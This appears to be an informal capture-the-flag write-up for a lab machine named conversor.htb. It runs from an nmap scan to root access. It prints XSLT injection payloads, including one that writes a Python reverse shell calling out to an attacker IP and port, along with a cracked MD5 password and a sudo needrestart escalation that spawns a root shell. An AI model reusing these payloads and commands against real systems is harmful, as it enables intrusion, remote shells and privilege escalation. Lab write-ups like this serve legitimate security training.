╰─$ nmap -sV -sC 10.129.2.173            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 00:18 CET
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 00:19 (0:00:00 remaining)
Stats: 0:01:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 00:20 (0:00:00 remaining)
Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 00:20 (0:00:00 remaining)
Stats: 0:03:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 00:21 (0:00:00 remaining)
Stats: 0:03:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 00:22 (0:00:00 remaining)
Nmap scan report for 10.129.2.173
Host is up (2.4s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.62 seconds




1)  create new account and ligin to uplaod the XSLT FILE
2) detect the XSLT inejction  attack  by grerorme the version and the vendor name 
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
</xsl:template>
</xsl:stylesheet>

Version: 1.0
Vendor: libxslt

3) try to write new file on the web server on 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common" 
  extension-element-prefixes="exsl"
  version="1.0">

  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/static/evil.txt" method="text">
      <xsl:text> <![CDATA[Hello World!]]>
      </xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>


file creaded :))) http://conversor.htb/static/evil.txt


4) we will uplaod  a  shell  that we be excuted in the scripts/*






<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/dd.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.245",2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>



5) priv esc: i find a db file in 
sqlite3 users.db
sqlite> select * from users
   ...> ;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec

we wil crack the md5 hash: with hashcat and find 5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm


6) we will login with ssh with this creds : fismathack:Keepmesafeandwarm

7) sudo -l : /usr/sbin/needrestart

from https://gtfobins.org/gtfobins/needrestart/ we can run a perl script 
echo 'exec "/bin/sh"' > /tmp/pwn
sudo /usr/sbin/needrestart  -c /tmp/pwn
# id
uid=0(root) gid=0(root) groups=0(root)





